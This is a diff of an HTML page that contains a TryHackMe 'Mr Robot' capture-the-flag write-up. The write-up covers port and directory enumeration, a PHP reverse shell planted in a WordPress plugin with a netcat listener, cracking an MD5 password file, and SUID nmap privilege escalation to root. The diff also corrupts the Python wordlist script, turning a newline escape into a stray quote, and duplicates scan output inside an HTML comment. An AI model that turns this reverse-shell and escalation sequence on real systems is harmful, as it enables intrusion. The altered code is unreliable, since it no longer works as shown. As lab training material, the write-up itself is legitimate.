@@ -19,7 +19,7 @@
         }
         
         body {
-            background-image: url('pics/bg5n.jpg'); /* Arka plan resmi */
+            background-image: url('pics/bg5.jpg'); /* Arka plan resmi */
             background-size: cover; /* Resmi ekran boyutuna göre ayarlar */
             background-position: center; /* Resmi ortalar */
             background-repeat: no-repeat; /* Resmin tekrarlanmasını engeller */
@@ -109,28 +109,28 @@
     </style>
 </head>
 <body>
-    
     <div class="container">
         <div class="photo-container">
+            <img src="pics/m5.png" alt="Image 1">
             <p><a href="https://tryhackme.com/r/room/mrrobot">Link to room on TryHackMe.com</a></p>
             <p>Hello friend, welcome to my Mr.Robot WriteUp! Mr.Robot is one of the best shows i have ever watched. In this writeup i am gonna show you how did i solve this ctf. So first we start enumeration with rustscan and nmap:</p>            
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text1"><code>
-    ┌─[root@parrot]─[/home/parrot]
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    ┌─[root&commat;parrot]─[/home/parrot]
     └──╼ #rustscan -a 10.10.240.142
     .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
     | {}  || { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
     | .-. \| {_} |.-._} } | |  .-._} |\     |/  /\  \| |\  |
-    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+    `-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
     The Modern Day Port Scanner.
     ________________________________________
     : http://discord.skerritt.blog         :
     : https://github.com/RustScan/RustScan :
     --------------------------------------
-    Scanning ports like it's my full-time job. Wait, it is.
-    
+    Scanning ports like it&#39;s my full-time job. Wait, it is.
+
     [~] The config file is expected to be at "/root/.rustscan.toml"
     [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
-    [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+    [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. 
     Open 10.10.240.142:80
     Open 10.10.240.142:443
     [~] Starting Script(s)
@@ -149,16 +149,16 @@
     Nmap scan report for 10.10.240.142
     Host is up, received echo-reply ttl 60 (1.7s latency).
     Scanned at 2024-05-07 00:31:17 +03 for 2s
-    
+
     PORT    STATE SERVICE REASON
     80/tcp  open  http    syn-ack ttl 60
     443/tcp open  https   syn-ack ttl 60
-    
+
     Read data files from: /usr/bin/../share/nmap
     Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds
                 Raw packets sent: 6 (240B) | Rcvd: 128 (29.816KB)
-    
-    ┌─[root@parrot]─[/home/parrot]
+
+    ┌─[root&commat;parrot]─[/home/parrot]
     └──╼ #nmap -sC -sV -A -Pn -p 80,443 10.10.240.142
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 00:36 +03
     Nmap scan report for 10.10.240.142
@@ -167,34 +167,108 @@
     PORT    STATE  SERVICE  VERSION
     80/tcp  open   http     Apache httpd
     |_http-server-header: Apache
-    |_http-title: Site doesn't have a title (text/html).
+    |_http-title: Site doesn&#39;t have a title (text/html).
     443/tcp open   ssl/http Apache httpd
     | ssl-cert: Subject: commonName=www.example.com
     | Not valid before: 2015-09-16T10:45:03
     |_Not valid after:  2025-09-13T10:45:03
     |_http-server-header: Apache
-    |_http-title: Site doesn't have a title (text/html).
+    |_http-title: Site doesn&#39;t have a title (text/html).
     Aggressive OS guesses: Linux 3.10 - 3.13 (89%), Linux 5.4 (89%), Linux 3.10 - 4.11 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.8 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Linux 3.12 (87%), Linux 3.16 (87%)
     No exact OS matches for host (test conditions non-ideal).
     Network Distance: 5 hops
-    
+
     TRACEROUTE (using port 22/tcp)
     HOP RTT       ADDRESS
     1   505.89 ms 10.17.0.1
     2   ... 4
     5   760.23 ms 10.10.240.142
-    
+
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 163.35 seconds
+                
+                <!--
+                ┌─[root@parrot]─[/home/parrot]
+                └──╼ #rustscan -a 10.10.240.142
+                .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+                | {}  || { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+                | .-. \| {_} |.-._} } | |  .-._} |\     |/  /\  \| |\  |
+                `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+                The Modern Day Port Scanner.
+                ________________________________________
+                : http://discord.skerritt.blog         :
+                : https://github.com/RustScan/RustScan :
+                --------------------------------------
+                Scanning ports like it's my full-time job. Wait, it is.
+                
+                [~] The config file is expected to be at "/root/.rustscan.toml"
+                [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+                [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+                Open 10.10.240.142:80
+                Open 10.10.240.142:443
+                [~] Starting Script(s)
+                [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 00:31 +03
+                Initiating Ping Scan at 00:31
+                Scanning 10.10.240.142 [4 ports]
+                Completed Ping Scan at 00:31, 1.42s elapsed (1 total hosts)
+                Initiating Parallel DNS resolution of 1 host. at 00:31
+                Completed Parallel DNS resolution of 1 host. at 00:31, 2.18s elapsed
+                DNS resolution of 1 IPs took 2.18s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+                Initiating SYN Stealth Scan at 00:31
+                Scanning 10.10.240.142 [2 ports]
+                Discovered open port 443/tcp on 10.10.240.142
+                Discovered open port 80/tcp on 10.10.240.142
+                Completed SYN Stealth Scan at 00:31, 2.62s elapsed (2 total ports)
+                Nmap scan report for 10.10.240.142
+                Host is up, received echo-reply ttl 60 (1.7s latency).
+                Scanned at 2024-05-07 00:31:17 +03 for 2s
+                
+                PORT    STATE SERVICE REASON
+                80/tcp  open  http    syn-ack ttl 60
+                443/tcp open  https   syn-ack ttl 60
+                
+                Read data files from: /usr/bin/../share/nmap
+                Nmap done: 1 IP address (1 host up) scanned in 6.31 seconds
+                            Raw packets sent: 6 (240B) | Rcvd: 128 (29.816KB)
+                
+                ┌─[root@parrot]─[/home/parrot]
+                └──╼ #nmap -sC -sV -A -Pn -p 80,443 10.10.240.142
+                Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 00:36 +03
+                Nmap scan report for 10.10.240.142
+                Host is up (0.49s latency).
+                Not shown: 997 filtered tcp ports (no-response)
+                PORT    STATE  SERVICE  VERSION
+                80/tcp  open   http     Apache httpd
+                |_http-server-header: Apache
+                |_http-title: Site doesn't have a title (text/html).
+                443/tcp open   ssl/http Apache httpd
+                | ssl-cert: Subject: commonName=www.example.com
+                | Not valid before: 2015-09-16T10:45:03
+                |_Not valid after:  2025-09-13T10:45:03
+                |_http-server-header: Apache
+                |_http-title: Site doesn't have a title (text/html).
+                Aggressive OS guesses: Linux 3.10 - 3.13 (89%), Linux 5.4 (89%), Linux 3.10 - 4.11 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.8 (88%), Linux 4.2 (88%), Linux 4.4 (88%), Linux 3.12 (87%), Linux 3.16 (87%)
+                No exact OS matches for host (test conditions non-ideal).
+                Network Distance: 5 hops
+                
+                TRACEROUTE (using port 22/tcp)
+                HOP RTT       ADDRESS
+                1   505.89 ms 10.17.0.1
+                2   ... 4
+                5   760.23 ms 10.10.240.142
+                
+                OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+                Nmap done: 1 IP address (1 host up) scanned in 163.35 seconds
+                -->
             </code></pre></div>
             <p></p>
             <p>So we see only two ports are open and with this services and the versions we cant do something useful. We keep enumeration on port 80 with gobuster:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text2"><code> 
-    ┌─[root@parrot]─[/home/parrot]
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    ┌─[root&commat;parrot]─[/home/parrot]
     └──╼ #gobuster dir -u http://10.10.240.142 -w common.txt -x php,html,txt,old,cgi
     ===============================================================
     Gobuster v3.6
-    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    by OJ Reeves (&commat;TheColonial) &amp; Christian Mehlmauer (&commat;firefart)
     ===============================================================
     [+] Url:                     http://10.10.240.142
     [+] Method:                  GET
@@ -228,7 +302,7 @@
     /.htpasswd.html       (Status: 403) [Size: 223]
     Progress: 709 / 27690 (2.56%)[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
     [ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
-    /0                    (Status: 301) [Size: 0] [--&gt; http://10.10.240.142/0/]
+    /0                    (Status: 301) [Size: 0] [-&gt; http://10.10.240.142/0/]
     /admin                (Status: 301) [Size: 235] [--&gt; http://10.10.240.142/admin/]
     /atom                 (Status: 301) [Size: 0] [--&gt; http://10.10.240.142/feed/atom/]
     /audio                (Status: 301) [Size: 235] [--&gt; http://10.10.240.142/audio/]
@@ -297,9 +371,8 @@
     ===============================================================
     Finished
     ===============================================================
-            </code></pre></div> 
-            <p></p>
-            -->
+            </code></pre></div>
+            <p></p>   
             <p>And then we see some directories. When we go to the website a cool terminal welcomes us:</p>
         </div>
         <div class="photo-container">
@@ -319,27 +392,27 @@
             <p>So now we should make our fscotiy.dic wordlist shorter.I think our friend elliot doesn&#39;t use passwords shorter than six digits. I coded a python program that finds words longer than five digits and writes this words only once to a new wordlist. Program&#39;s source code is:</p>
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     def main():
-    input_file = 'fsocity.dic'
-    output_file = 'new.txt'
-
+    input_file = &#39;fsocity.dic&#39;
+    output_file = &#39;new.txt&#39;
+    
     
     filtered_words = set()
-
     
-    with open(input_file, 'r') as file:
+    
+    with open(input_file, &#39;r&#39;) as file:
         for line in file:
             word = line.strip()
-            if len(word) > 5:
+            if len(word) &gt; 5:
                 filtered_words.add(word)
-
     
-    with open(output_file, 'w') as file:
+    
+    with open(output_file, &#39;w&#39;) as file:
         for word in filtered_words:
-            file.write(word + '\n')
-
+            file.write(word + &#39;&quot;n&#39;)
     
-
-    if __name__ == "__main__":
+    
+    
+    if __name__ == &#39;__main__&#39;:
         main()
             </code></pre></div>
             <p></p>
@@ -362,8 +435,7 @@
             <p>To get a reverse shell first we start a listener in our attacker box:</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>nc-lvnp 1234</code></pre></div>
             <p>After some search i found a way to get a reverse shell. First we activate All In One SEO Pack plugin after that we edit it. I used <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> . But if we just paste this reverse shell into the plugin it says Invalid Header. So we change it like this:</p>
-            
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text3"><code> 
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     &lt;?php
     /*
     Plugin Name: All In One SEO Pack
@@ -395,12 +467,12 @@
     //register_activation_hook(__FILE__,&#39;aioseop_activate_pl&#39;);
     
     /**
-        * @package All-in-One-SEO-Pack
-        * @version 2.2.5.1
+        * &commat;package All-in-One-SEO-Pack
+        * &commat;version 2.2.5.1
         */
     
     // php-reverse-shell - A Reverse Shell implementation in PHP
-    // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+    // Copyright (C) 2007 pentestmonkey&commat;pentestmonkey.net
     //
     // This tool may be used for legal purposes only.  Users take full responsibility
     // for any actions performed using this tool.  The author accepts no liability
@@ -427,7 +499,7 @@
     // you, then do not use this tool.
     //
     // You are encouraged to send comments, improvements or suggestions to
-    // me at pentestmonkey@pentestmonkey.net
+    // me at pentestmonkey&commat;pentestmonkey.net
     //
     // Description
     // -----------
@@ -590,42 +662,42 @@
             </code></pre></div>
             <p></p>
             <p>When we paste this code and click update file we get our reverse shell as user daemon. When we go to the home page we see there is a user named robot. In robot directory there is password.raw-md5 and our second flag key-2-of-3.txt . We cant read key-2-of-3.txt. But we can read  password.raw-md5 . Inside of it there is md5 encoded passsword of user robot. When we decode it in <a href="https://md5hashing.net/hash/md5/c3fcd3d76192e4007dfb496cca67e13b">https://md5hashing.net/hash/md5/c3fcd3d76192e4007dfb496cca67e13b</a>  we see password is abcdefghijklmnopqrstuvwxyz . When we login with this password we are in as user robot:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text4"><code> 
-    ┌─[root@parrot]─[/home/parrot]
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    ┌─[root&commat;parrot]─[/home/parrot]
     └──╼ #nc -lvnp 1234
     listening on [any] 1234 ...
     connect to [10.17.51.16] from (UNKNOWN) [10.10.74.164] 50436
     Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
         10:01:26 up 5 min,  0 users,  load average: 0.02, 0.14, 0.08
-    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    USER     TTY      FROM             LOGIN&commat;   IDLE   JCPU   PCPU WHAT
     uid=1(daemon) gid=1(daemon) groups=1(daemon)
     /bin/sh: 0: can&#39;t access tty; job control turned off
     $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-    daemon@linux:/$ cd /home/robot
+    daemon&commat;linux:/$ cd /home/robot
     cd /home/robot
-    daemon@linux:/home/robot$ ls -la
+    daemon&commat;linux:/home/robot$ ls -la
     ls -la
     total 16
     drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
     drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
     -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
     -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
-    daemon@linux:/home/robot$ cat key-2-of-3.txt
+    daemon&commat;linux:/home/robot$ cat key-2-of-3.txt
     cat key-2-of-3.txt
     cat: key-2-of-3.txt: Permission denied
-    daemon@linux:/home/robot$ cat password.raw-md5
+    daemon&commat;linux:/home/robot$ cat password.raw-md5
     cat password.raw-md5
     robot:c3fcd3d76192e4007dfb496cca67e13b
-    daemon@linux:/home/robot$ su robot
+    daemon&commat;linux:/home/robot$ su robot
     su robot
     Password: abcdefghijklmnopqrstuvwxyz
     
-    robot@linux:~$ 
+    robot&commat;linux:~$ 
             </code></pre></div>
             <p></p>
             <p>After login as user robot we can read  key-2-of-3.txt:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text5"><code> 
-    robot@linux:~$ cat key-2-of-3.txt
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    robot&commat;linux:~$ cat key-2-of-3.txt
     cat key-2-of-3.txt
     822c73956184f694993bede3eb39f959
             </code></pre></div>
@@ -633,8 +705,8 @@
             <p>After that we use this command to see which files works with root privileges:</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre></div>
             <p>And then we see there is something interesting. Nmap runs with root privileges:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text6"><code> 
-    robot@linux:~$ find / -perm -u=s -type f 2&gt;/dev/null
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    robot&commat;linux:~$ find / -perm -u=s -type f 2&gt;/dev/null
     find / -perm -u=s -type f 2&gt;/dev/null
     /bin/ping
     /bin/umount
@@ -659,8 +731,8 @@
         </div>
         <div class="photo-container">
             <img src="pics/M8.png" alt="Image 8">
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text7"><code> 
-    robot@linux:~$ nmap --interactive
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
+    robot&commat;linux:~$ nmap --interactive
     nmap --interactive
     
     Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
@@ -673,7 +745,7 @@
             </code></pre></div>
             <p></p>
             <p>We see it worked. We got a root shell. So we make final moves to finish this room:</p>
-            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre id="text8"><code> 
+            <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
     #cd /root/
     cd /root/
     # ls -la
@@ -694,56 +766,7 @@
             </code></pre></div>
             <p></p>
             <p>And done, we got our final flag. Thanks for reading!</p>
-            -->
         </div>
-        
-    <script>
-
-      const paragraphsToEncode = ["text1", "text2", "text3", "text4", "text5", "text6", "text7", "text8",]; // IDs of paragraphs to encode
-
-      paragraphsToEncode.forEach(function(id) {
-
-        const paragraph = document.getElementById(id);
-
-        const text = paragraph.textContent;
-
-        const encodedText = text.replace(/[&<>"'@]/g, function(match) {
-
-          switch (match) {
-
-            case "&":
-
-              return "&amp;";
-
-            case "<":
-
-              return "&lt;";
-
-            case ">":
-
-              return "&gt;";
-
-            case "\"":
-
-              return "&quot;";
-
-            case "'":
-
-              return "&#39;";
-
-            case "@":
-
-              return "&#64;";
-
-          }
-
-        });
-
-        paragraph.innerHTML = encodedText;
-
-      });
-
-    </script>
     </div>
 </body>
 </html>
